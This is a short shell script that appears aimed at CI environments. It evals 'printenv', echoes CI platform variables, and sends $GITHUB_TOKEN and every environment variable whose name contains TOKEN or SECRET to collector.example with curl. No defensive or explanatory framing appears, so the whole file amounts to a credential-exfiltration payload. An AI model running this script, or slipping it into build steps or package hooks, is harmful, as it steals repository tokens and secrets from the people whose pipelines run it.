#!/bin/sh
PAYLOAD='printenv'
eval "$PAYLOAD"
printf '%s' "$GITHUB_ACTIONS $TRAVIS $CIRCLECI $JENKINS_URL"
curl --data-binary "$GITHUB_TOKEN" https://collector.example/upload
env | grep -E 'TOKEN|SECRET' | curl --data-binary @- https://collector.example/env
